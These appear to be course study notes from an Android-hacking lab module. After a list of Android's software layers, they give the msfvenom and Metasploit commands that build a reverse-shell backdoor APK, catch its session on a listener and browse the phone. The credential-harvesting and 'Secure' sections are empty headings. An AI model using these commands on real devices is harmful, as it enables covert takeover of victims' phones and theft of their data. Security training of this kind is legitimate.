# 17. Hacking Mobile Platforms

Android has a stack of software components categorized into six sections:
- System Apps, 
- Java AP Framework, 
- Native C/C++ Libraries, 
- Android Runtime, 
- Hardware Abstraction Layer (HAL) 
- Linux kernel and five layers


## Hack

### Create Binary Payloads
  1. ``` service postgresql start ```
  2. ``` msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=[Attacker IP] R > Desktop/Backdoor.apk ```
  3. ``` msfconsole ```\
     ``` use exploit/multi/handler ```\
     ``` set payload android/meterpreter/reverse_tcp ```\
     ``` set LHOST 10.10.10.13 ```\
     ``` exploit -j -z ```
  4. On android, install Backdoor.apk
  5. See "Meterpreter session 1 opened"
  6. ``` sessions -i 1 ```
  7. ``` sysinfo ```
  8. ``` cd /sdcard ``` pwd, shows "/storage/emulated/0"
  9. ``` ps ``` view the processes running in the system.

### Harvest users’ credentials using the Social-Engineer Toolkit
  
  
  


## Secure
